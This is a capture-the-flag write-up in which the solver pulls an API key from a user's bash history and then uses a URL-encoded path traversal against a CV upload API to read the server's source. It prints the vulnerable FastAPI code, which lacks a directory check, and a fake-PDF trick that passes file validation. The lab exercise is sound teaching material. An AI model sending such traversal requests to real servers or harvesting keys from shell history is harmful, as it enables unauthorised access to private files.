# Behind the Curtain 

# Description

> Excellent! You've gained access to John's development workspace.
> 
> Now it's time to fix that system! Wait, you just got a note from security...
> 
> Just when you thought nothing more could go wrong - there's a new vulnerability alert on the CV Upload System!
> 
> But okay, it's time to focus - your most important mission is still getting the CV upload system working. Can you help fix it?

## Solution

We get access to a shell:

```

                                   .                   
                               .+#%%+                  
                           :+#%%=-.                    
                       .::---.      :+*-               
                   .:::..    .-*#%@%*=:.               
               .::..    ..:::--::.                     
           .:.    .:::...                              
        ..  .::..                                      
   :=======================++++++++=                   
   -###############################*                   
   .+*********************#########:                   
    :*********************########+                    
     :*******************########=                     
      .=*****************######*.                      
        .=*************######*:                        
           .=#####***#####*:                           
            :@@@@@@@@@@@@@+                            
             :::::::::::::.        

╔╦╗╔═╗╦╔═╦ ╦╔═╗   ╔╦╗   ╔═╗  ╦═╗╔═╗╦ ╦╔═╗┬
 ║ ║ ║╠╩╗╚╦╝║ ║ ▪  ║  ─  ═╣  ║ ║╠═╣╚╦╝╚═╗│
 ╩ ╚═╝╩ ╩ ╩ ╚═╝    ╩    ╚═╝  ╩═╝╩ ╩ ╩ ╚═╝o
user@john-pc:~$
```

Let's start snooping around:

```console
user@john-pc:~$ ls
cv_client.py  deployment_notes.txt
user@john-pc:~$ cat deployment_notes.txt 
deployment_notes.txt
===================

March 14, 2021
--------------
Initial CV upload system deployed. Basic candidate tracking for the recruiting team. 
-J

June 19, 2021
--------------
Minor parsing modifications.
-J

July 8, 2022
------------
Added API authentication after security review. New /candidates endpoint for HR queries. 
-J

November 22, 2024
-----------------
Added portfolio_link field - recruiters wanted more candidate info. 
-J

September 15, 2025
------------------
Updated the CV server to accept the new field HR requested, no time to verify but pretty sure everything is working! 
Gotta catch my flight ✈️ 
```

We can also `cat cv_client.py` to inspect the script contents:

```python
#!/usr/bin/env python3
import os
import sys
import requests

API_BASE = "http://34.118.229.123:80"
API_KEY = os.getenv("CV_API_KEY")


headers = {"X-API-Key": API_KEY, "Content-Type": "application/json"}


def upload_candidate(name, email, portfolio_link=""):
    data = {"name": name, "email": email, "portfolio_link": portfolio_link}

    resp = requests.post(f"{API_BASE}/upload", json=data, headers=headers)
    if resp.status_code == 200:
        print(f"✓ Uploaded {email} {resp.text}")
    else:
        print(f"✗ Failed to upload {email}: {resp.text}")


def list_all_candidates():
    resp = requests.get(f"{API_BASE}/candidates/", headers=headers)
    if resp.status_code != 200:
        print(f"Error: {resp.text}")
        return

    candidates = resp.text.strip().split("\n")

    for candidate in candidates:
        if not candidate:
            continue
        resp = requests.get(f"{API_BASE}/candidates/{candidate}", headers=headers)
        if resp.status_code == 200:
            print(resp.text)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: cv_client.py [upload|list]")
        sys.exit(1)

    if sys.argv[1] == "upload":
        if len(sys.argv) < 4:
            print("Usage: cv_client.py upload <name> <email> [portfolio_link]")
            sys.exit(1)
        portfolio = sys.argv[4] if len(sys.argv) > 4 else ""
        upload_candidate(sys.argv[2], sys.argv[3], portfolio)

    elif sys.argv[1] == "list":
        list_all_candidates()

    else:
        print("Unknown command. Use 'upload' or 'list'")
```

This looks like a script used to interact with the CV submission system. Let's run it:

```console
user@john-pc:~$ python3 cv_client.py list
Error: 401: unauthorized
```

Based on the response code and the script content, it's likely that there's something wrong with the `X-API-Key` header, derived from the `CV_API_KEY` environment variable. Is it even there?

```console
user@john-pc:~$ printenv CV_API_KEY
user@john-pc:~$ 
```

No, it isn't. Where do we get it from then? Time to continue looking around:

```console
user@john-pc:~$ ls -al
total 24
drwxr-xr-x 2 user user 4096 Nov 15 18:41 .
drwxr-xr-x 3 user user 4096 Sep  8 11:46 ..
-rw------- 1 user user  817 Nov 15 18:41 .bash_history
-rw-r--r-- 1 user user 3771 Nov 15 18:41 .bashrc
-rwxr-xr-x 1 user user 1570 Nov 15 18:41 cv_client.py
-rw-r--r-- 1 user user  641 Nov 15 18:41 deployment_notes.txt
```

It looks like we might have some Bash history saved for us. This includes the most recent commands that John might have run in his terminal!

```console
user@john-pc:~$ cat .bash_history 
ls -la
cat cv_client.py
curl http://34.118.229.123:80/
curl http://34.118.229.123:80/info
cat deployment_notes.txt
vim deployment_notes.txt
ls -la
python cv_client.py list
vim cv_client.py
python cv_client.py list
vim cv_client.py
python cv_client.py list
vim deployment_notes.txt
cd /tmp
wget https://github.com/john-dev/scripts/archive/refs/heads/main.zip
unzip main.zip
ls -la
cd -
ls -la
cat cv_client.py
vim cv_client.py
vim deployment_notes.txt
python cv_client.py upload "Test User" "test@ramenrunaway.com"
curl http://34.118.229.123:80/info | jq
vim cv_client.py
alias curl='curl -H "X-API-Key: ShibuyaCrossing!1"'
c http://34.118.229.123:80/candidates/
python cv_client.py list
ls candidates/
cd /opt/cv-server
ls -la
curl localhost:80/
curl localhost:80/info
tail -f logs/access.log
```

Indeed, there are many interesting things here. The most useful command seems to be `alias curl='curl -H "X-API-Key: ShibuyaCrossing!1"'` which might reveal the API key we're looking for!

```console
user@john-pc:~$ export CV_API_KEY='ShibuyaCrossing!1'

user@john-pc:~$ printenv CV_API_KEY
ShibuyaCrossing!1

user@john-pc:~$ python3 cv_client.py list
{
  "name": "Alex Thompson",
  "email": "athompson@cloudforge.tech",
  "portfolio_link": "https://dev.to/alexthomp_90%20",
  "applied": "2025-11-12T09:32:14.108331+00:00",
  "status": "pending"
}
{
  "name": "Emma Chen",
  "email": "emma.chen@nexusdigital.com",
  "portfolio_link": "https://linkedin.com/in/emmachen-8a5b92",
  "applied": "2025-11-11T14:18:27.094156+00:00",
  "status": "pending"
}
{
  "name": "James Wilson",
  "email": "jwilson@velocitytech.io",
  "portfolio_link": "https://gitlab.com/jimwils342",
  "applied": "2025-11-10T16:22:41.408010+00:00",
  "status": "pending"
}
{
  "name": "Michael Rodriguez",
  "email": "mrodriguez@gmail.com",
  "portfolio_link": "https://github.com/mrodrgzdv92",
  "applied": "2025-11-09T11:45:03.240464+00:00",
  "status": "pending"
}
requirements.txt
server_V1.4.py
{
  "name": "Priya Patel",
  "email": "priya.patel@dataminds.co",
  "portfolio_link": "https://kaggle.com/priya~patel~23",
  "applied": "2025-11-07T15:29:12.360309+00:00",
  "status": "pending"
}
{
  "name": "Sarah Kim",
  "email": "sarah.kim@bluewavedesigns.io",
  "portfolio_link": "https://behance.net/gallery/182934756/Sarah-Kim-Portfolio",
  "applied": "2025-11-06T10:07:19.577569+00:00",
  "status": "pending"
}
```

Cool, we can now access the CV service! Output is mostly standard, with the exception of `requirements.txt` and `server_V1.4.py` somehow stuck in the middle. We'll return to that later.

What about CV submission?

```console
user@john-pc:~$ python3 cv_client.py upload "Test User" "test@ramenrunaway.com"
✗ Failed to upload test@ramenrunaway.com: 400: missing fields
```

Interesting, the server side didn't like something in our request. For completeness, let's try out the different raw API endpoints found in `.bash_history`:

```console
user@john-pc:~$ curl http://34.118.229.123:80/info
{"service":"CV Intake API","version":"1.5","status":"ok","timestamp":"2025-11-15T18:54:17.499514+00:00"}

user@john-pc:~$ curl http://34.118.229.123:80/
CV Upload API
=============

Available Endpoints:
-------------------

1. API Info
    GET /info
    Returns basic service status and timestamp.

2. Candidates Info
    GET /candidates
    Returns candidates personal information

2. Upload CV
    POST /upload
    Submit CV with personal information.

    Required headers:
    - X-API-Key: Your API key

Response Codes:
--------------
200 - Success
400 - Bad request (validation failed)
401 - Unauthorized (invalid API key)

user@john-pc:~$ curl http://34.118.229.123:80/candidates/
401: unauthorized
```

Nothing too dramatic here. For the last endpoint, we obviously need the API key, so let's add that:

```console
user@john-pc:~$ alias c='curl -H "X-API-Key: ShibuyaCrossing!1"'
user@john-pc:~$ c http://34.118.229.123:80/candidates/
athompson@cloudforge.tech
emma.chen@nexusdigital.com
jwilson@velocitytech.io
mrodriguez@gmail.com
portfolio.me-profile=%2f%2e%2e%2f%2e%2e%2folder
priya.patel@dataminds.co
sarah.kim@bluewavedesigns.io
```

What's that there? `portfolio.me-profile=%2f%2e%2e%2f%2e%2e%2folder`?
This looks like a A path traversal vulnerability!

> A path traversal vulnerability is a security flaw where an attacker can access unauthorized files and directories on a server by manipulating user-supplied input that is used to construct file paths
. Attackers achieve this by injecting special characters like ../ to navigate "up" the directory structure, potentially reading sensitive files like configuration data or source code. These attacks happen when user input is not properly validated or sanitized before being used by the application's file system functions

When we decode the string above, it's easier to see the path:

```python
>>> import urllib.parse
>>> urllib.parse.unquote("%2f%2e%2e%2f%2e%2e%2folder")
'/../../older'
```

The server seems to return us the contents of that directory!

We can use `curl` to access it ourselves:

```console
user@john-pc:~$ c http://34.118.229.123:80/candidates/portfolio.me-profile=%2f%2e%2e%2f%2e%2e%2folder
requirements.txt
server_V1.4.py
```

As expected, we get a list of files in the folder. Furthermore, it looks like we can use the same method to read files too! We'll call 
`c http://34.118.229.123:80/candidates/portfolio.me-profile=%2f%2e%2e%2f%2e%2e%2folder/server_V1.4.py` to read the server's source code:

```python
import json
import os
from typing import Any, Dict, Optional
from datetime import datetime, timezone
from fastapi import FastAPI, Header, Request
from fastapi.responses import JSONResponse, PlainTextResponse


app = FastAPI()


CV_API_KEY = "ShibuyaCrossing!1"


@app.get("/", response_class=PlainTextResponse)
async def root() -> str:
    return """CV Upload API
=============

Available Endpoints:
-------------------

1. API Info
    GET /info
    Returns basic service status and timestamp.

2. Candidates Info
    GET /candidates
    Returns candidates personal information

2. Upload CV
    POST /upload
    Submit CV with personal information.

    Required headers:
    - X-API-Key: Your API key

Response Codes:
--------------
200 - Success
400 - Bad request (validation failed)
401 - Unauthorized (invalid API key)
"""


# NEW: /info endpoint to provide basic server status
@app.get("/info")
async def get_info() -> Dict[str, Any]:
    return {
        "service": "CV Intake API",
        "version": "1.4",
        "status": "ok",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


@app.get("/candidates/{path:path}")
async def get_candidates(
    path: str = "", x_api_key: Optional[str] = Header(default=None, alias="X-API-Key")
):
    # API KEY REQUIRED
    if not x_api_key or x_api_key != CV_API_KEY:
        return PlainTextResponse("401: unauthorized", status_code=401)

    candidates_dir = "/opt/cv-server/candidates"
    full_path = os.path.normpath(os.path.join(candidates_dir, path))

    if not full_path.startswith(candidates_dir):
        return PlainTextResponse("403: Access denied", status_code=403)

    if os.path.isdir(full_path):
        items = sorted(os.listdir(full_path))
        return PlainTextResponse("\n".join(items))
    elif os.path.isfile(full_path):
        with open(full_path, "r") as f:
            return PlainTextResponse(f.read())
    else:
        return PlainTextResponse("404: Not found", status_code=404)


@app.post("/upload")
async def upload_cv(
    request: Request,
    x_api_key: Optional[str] = Header(default=None, alias="X-API-Key"),
):
    # API KEY REQUIRED
    if not x_api_key or x_api_key != CV_API_KEY:
        return PlainTextResponse("401: unauthorized", status_code=401)

    try:
        data = await request.json()
    except Exception:
        return PlainTextResponse("400: invalid JSON", status_code=400)

    name = data.get("name", "").strip()
    email = data.get("email", "").strip()
    portfolio_link = data.get("portfolio_link", "").strip()

    if not name or not email:
        return PlainTextResponse("400: missing fields", status_code=400)

    candidate_data = {
        "name": name,
        "email": email,
        "portfolio_link": portfolio_link,
        "applied": datetime.now(timezone.utc).isoformat(),
        "status": "pending",
    }

    candidates_dir = "/opt/cv-server/candidates"
    filepath = os.path.join(candidates_dir, email)

    try:
        with open(filepath, "w") as f:
            json.dump(candidate_data, f, indent=2)
    except Exception:
        return PlainTextResponse("500: failed to save candidate data", status_code=500)

    return JSONResponse(
        {
            "status": "success",
            "message": "Candidate information received",
            "candidate_id": email,
        }
    )


if __name__ == "__main__":
    import uvicorn

    # Run directly with the in-memory app to avoid import path issues
    uvicorn.run(app, host="0.0.0.0", port=9999, reload=False)
    
```

Based on the sources above, it isn't really clear why our CV upload request got rejected. We have provided the `name` and `email` fields as expected. However, retracing our steps, we might notice that this is version `1.4` of the server, while our `/info` API told us that we're running version `1.5`!

```console
user@john-pc:~$ curl http://34.118.229.123:80/info
{"service":"CV Intake API","version":"1.5","status":"ok","timestamp":"2025-11-15T18:54:17.499514+00:00"}
```

We are, admittedly, in the `older` folder. Let's continue snooping around, maybe we'll find the newer version somewhere.

```console
user@john-pc:~$ c http://34.118.229.123:80/candidates/portfolio.me-profile=%2f%2e%2e%2f%2e%2e%2folder/%2e%2e        
.bash_logout
.bashrc
.profile
candidates
older
requirements.txt
server_V1.5.py
```

There it is, one level up! We can read the sources with `c http://34.118.229.123:80/candidates/portfolio.me-profile=%2f%2e%2e%2f%2e%2e%2folder/%2e%2e%2fserver_V1.5.py`:

```python
import json
import os
from typing import Any, Dict, Optional
from datetime import datetime, timezone
from fastapi import FastAPI, Header, Request
from fastapi.responses import JSONResponse, PlainTextResponse
import base64

app = FastAPI()


CV_API_KEY = "ShibuyaCrossing!1"


@app.get("/", response_class=PlainTextResponse)
async def root() -> str:
    return """CV Upload API
=============

Available Endpoints:
-------------------

1. API Info
    GET /info
    Returns basic service status and timestamp.

2. Candidates Info
    GET /candidates
    Returns candidates personal information

2. Upload CV
    POST /upload
    Submit CV with personal information.

    Required headers:
    - X-API-Key: Your API key

Response Codes:
--------------
200 - Success
400 - Bad request (validation failed)
401 - Unauthorized (invalid API key)
"""


# NEW: /info endpoint to provide basic server status
@app.get("/info")
async def get_info() -> Dict[str, Any]:
    return {
        "service": "CV Intake API",
        "version": "1.5",
        "status": "ok",
        "timestamp": datetime.now(timezone.utc).isoformat(),
    }


@app.get("/candidates")
@app.get("/candidates/{path:path}")
async def get_candidates(
    path: str = "", x_api_key: Optional[str] = Header(default=None, alias="X-API-Key")
):
    # API KEY REQUIRED
    if not x_api_key or x_api_key != CV_API_KEY:
        return PlainTextResponse("401: unauthorized", status_code=401)

    candidates_dir = "/opt/cv-server/candidates"
    full_path = os.path.normpath(os.path.join(candidates_dir, path))

    if os.path.isdir(full_path):
        items = sorted(os.listdir(full_path))
        return PlainTextResponse("\n".join(items))
    elif os.path.isfile(full_path):
        with open(full_path, "r") as f:
            return PlainTextResponse(f.read())
    else:
        return PlainTextResponse("404: Not found", status_code=404)


@app.post("/upload")
async def upload_cv(
    request: Request,
    x_api_key: Optional[str] = Header(default=None, alias="X-API-Key"),
):
    # API KEY REQUIRED
    if not x_api_key or x_api_key != CV_API_KEY:
        return PlainTextResponse("401: unauthorized", status_code=401)

    try:
        data = await request.json()
    except Exception:
        return PlainTextResponse("400: invalid JSON", status_code=400)

    name = data.get("name", "").strip()
    email = data.get("email", "").strip()
    portfolio_link = data.get("portfolio_link", "").strip()
    resume_file = data.get("resume_file", "")

    if not name or not email or not resume_file:
        return PlainTextResponse("400: missing fields", status_code=400)

    try:
        resume_bytes = base64.b64decode(resume_file)
    except Exception:
        return PlainTextResponse("400: invalid format", status_code=400)

    if not validate_document_format(resume_bytes):
        return PlainTextResponse("400: invalid format", status_code=400)

    candidate_data = {
        "name": name,
        "email": email,
        "portfolio_link": portfolio_link,
        "applied": datetime.now(timezone.utc).isoformat(),
        "status": "pending",
        "resume_data": resume_file,
        "resume_size_kb": round(len(resume_bytes) / 1024, 2),
    }

    candidates_dir = "/opt/cv-server/candidates"
    filepath = os.path.join(candidates_dir, email)

    try:
        with open(filepath, "w") as f:
            json.dump(candidate_data, f, indent=2)
    except Exception:
        return PlainTextResponse("500: failed to save candidate data", status_code=500)

    return JSONResponse(
        {
            "status": "success",
            "message": "Application received",
            "candidate_id": email,
            "resume_size_kb": candidate_data["resume_size_kb"],
        }
    )


def validate_document_format(file_bytes: bytes) -> bool:
    """Validate document format"""
    if len(file_bytes) < 100:
        return False

    try:
        header = file_bytes[:8]
        return header[0:4] == b"%PDF" or header[1:5] == b"%PDF"
    except Exception:
        return False


if __name__ == "__main__":
    import uvicorn

    # Run directly with the in-memory app to avoid import path issues
    uvicorn.run(app, host="0.0.0.0", port=9999, reload=False)

```

This makes more sense. We not only need the `name` and `email` of the candidate, but also a `resume_file` which needs to look like a PDF (based on the oversimplified validation in `validate_document_format()`).

Now that we know what the missing field is, we can fix the `cv_client` script (if we can manage to overcome `vi`):

```console
user@john-pc:~$ cp cv_client.py cv_client.bak
user@john-pc:~$ vi cv_client.py
user@john-pc:~$ diff cv_client.py cv_client.bak
13,15c13,14
< def upload_candidate(name, email, resume_file, portfolio_link=""):
<     data = {"name": name, "email": email, "portfolio_link": portfolio_link,
<             "resume_file": resume_file}
---
> def upload_candidate(name, email, portfolio_link=""):
>     data = {"name": name, "email": email, "portfolio_link": portfolio_link}
46,47c45,46
<         if len(sys.argv) < 5:
<             print("Usage: cv_client.py upload <name> <email> <resume_file> [portfolio_link]")
---
>         if len(sys.argv) < 4:
>             print("Usage: cv_client.py upload <name> <email> [portfolio_link]")
49,50c48,49
<         portfolio = sys.argv[5] if len(sys.argv) > 5 else ""
<         upload_candidate(sys.argv[2], sys.argv[3], sys.argv[4], portfolio)
---
>         portfolio = sys.argv[4] if len(sys.argv) > 4 else ""
>         upload_candidate(sys.argv[2], sys.argv[3], portfolio)
```

Finally, we call the script with the extra "Resume File" which is crafted to pass the validation function, and get the flag:

```console
user@john-pc:~$ python3 cv_client.py upload "Test User" "test@ramenrunaway.com" $(python3 -c "import base64; print(base64.b64encode(b'%PDF' + b'A' * 100).decode())")
✓ Uploaded test@ramenrunaway.com {"status":"success","message":"Application received","candidate_id":"test@ramenrunaway.com","resume_size_kb":0.1,"flag":"Flag{You_F1x3d_Th3_CV_Upl0@d3r_You_Must_B3_@_R3@l_W1z@rd!}"}
```

> You've successfully fixed the CV upload system! John can enjoy his ramen in peace
 
The CTF is concluded with a letter from John:

> Konichiwa from Shibuya! 🍜
> 
> The ramen here is AMAZING. HR just texted me... the CV system is working again!
> Wait... Did you exploit a vulnerability in the system
to figure out how to fix it? That's some next-level security skills!
> 
> That's exactly the kind of sharp thinking we need for the R → PM Program.
> 
> So, what's next?  
> • Fill in your details below so we can get to know you better.  
> • Our team will reach out in the next few days to set up a quick call.  
> • Save the date: Talent Day = November 23, 2025.  
> 
> Now that the system is working again, why don't you give it a test run?
> (Standard links only please 😄)
> 
> \- John (じょん)
> 
> P.S. - The ramen's on me when I get back! 